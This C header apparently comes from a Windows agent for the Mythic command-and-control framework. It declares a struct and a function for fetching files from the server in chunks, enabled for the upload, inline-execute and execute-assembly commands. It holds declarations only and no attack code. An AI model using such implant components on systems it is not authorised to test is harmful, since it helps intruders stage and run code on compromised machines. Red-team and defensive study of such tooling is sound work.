#pragma once
#ifndef MYTHIC_H
#define MYTHIC_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"


#if defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY)


#define MAX_PATH 0x2000

typedef struct _MYTHIC_FILE {
    CHAR fileUuid[37];          // File UUID (36 + 1 for null terminator)
    UINT32 totalChunks;          // Total number of chunks
    UINT32 currentChunk;        // Current chunk number
    SIZE_T size;                // Size of the file
    PVOID buffer;               // Pointer to buffer data
} MYTHIC_FILE, *PMYTHIC_FILE;

DWORD MythicGetFileBytes(_In_ PCHAR taskUuid, _Inout_ MYTHIC_FILE* File);

#endif // defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY)

#endif  //MYTHIC_H